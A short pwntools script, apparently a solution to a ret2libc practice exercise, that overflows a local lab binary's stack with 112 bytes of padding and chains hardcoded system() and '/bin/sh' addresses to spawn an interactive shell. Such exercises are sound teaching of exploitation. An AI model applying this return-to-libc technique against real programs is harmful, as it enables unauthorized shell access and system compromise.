from pwn import *

io = process('../ex1-rop/ret2libc1')
sys_addr = 0x8048460
binsh_addr = 0x8048720
payload = b'A' * 112 + p32(sys_addr) + b'a'*4 + p32(binsh_addr)
io.sendline(payload)
io.interactive()
